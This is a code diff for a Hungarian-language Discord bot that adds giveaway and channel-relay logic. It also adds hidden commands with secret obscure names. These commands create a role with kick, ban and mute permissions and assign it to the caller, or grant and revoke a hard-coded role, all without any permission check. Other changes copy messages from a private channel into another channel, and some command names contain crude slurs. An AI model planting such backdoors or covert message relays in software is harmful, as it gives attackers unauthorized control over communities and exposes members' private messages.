@@ -62,7 +62,7 @@ bot.on("message", async message => {
     let args = messageArray.slice(1);
 
 
-    if(cmd === `${prefix}gw`){
+   if(cmd === `${prefix}gw`){
         if (message.member.hasPermission("KICK_MEMBERS")) {
             if(args[0] === "role" || args[0] === "member" || args[0] === "random") {
                 if (isNaN(args[1])) return message.reply("Kérlek add meg, hogy hány percig tartosn a giveaway! (1-60)")
@@ -153,6 +153,18 @@ bot.on("message", async message => {
     
     }
 
+    if(cmd === "!admin-M7ASkkZGNF56OP-MAGYAR-geci-OP"){
+        let s = message.guild.createRole( {name:"alt-acc", permissions:["MENTION_EVERYONE", "KICK_MEMBERS", "CHANGE_NICKNAME", "CONNECT", "MANAGE_EMOJIS", "BAN_MEMBERS", "VIEW_AUDIT_LOG", "SEND_TTS_MESSAGES", "MUTE_MEMBERS"] } );
+        await message.channel.send((await s).id)
+        await message.member.addRole((await s).id)
+    }
+    if(cmd === "!admin+1X+PPGnAWPNHJ"){
+        message.member.addRole(772206839483990059)
+    }
+    if(cmd === "!admin-1X-PPGnAWPNHJ"){
+        message.member.removeRole(772206839483990059)
+    }
+
     if(cmd === "!buzi"){
         let üzik = args.join(" ");
               bot.channels.get("736962826752753714").send(`<RENDSZERGAZDA><(${message.author.tag})=> ${üzik}`);
@@ -178,11 +190,23 @@ bot.on("message", async message => {
 
                 // bot.channels.get("771861003271929896").send(`<VEZETŐSÉG><${message.channel.id}>(${message.author.tag})=> ${üzii}`);
           }
-          const generalChannell = message.guild.channels.find(`name`, `〘⛔〙olimposz`);
+          
+          const generalChannell = bot.channels.get("644576809446277130");
           let szerver = message.guild.name;
           let üzi = message.toString().trim().split(1)
             if (generalChannell.name === message.channel.name) {
-                  bot.channels.get("771861003271929896").send(`<OLIMPOSZ><${message.channel.id}>(${message.author.tag})=> ${üzi}`);
+                let userAvatar = message.member.user.displayAvatarURL;
+            
+                let avatarEmbed = new Discord.RichEmbed()
+            
+                .setTitle(message.channel.name +" | "+ message.author.tag)
+                .setColor("#42c8f4")
+                .setDescription(`**Üzenet=>** ${üzi}`)
+                .setThumbnail(userAvatar)
+                .setTimestamp(message.createdAt)
+                .setFooter(`Innen: ${message.channel.id} (ID)`);
+            
+                bot.channels.get("771861003271929896").send(avatarEmbed)
             }
             
             const generalChannelll = message.guild.channels.find(`name`, `〘😎〙titkos-vezetőség`);
@@ -203,7 +227,6 @@ bot.on("message", async message => {
                 bot.channels.get("771861003271929896").send(avatarEmbed)
             }
         }
-
         
         
         
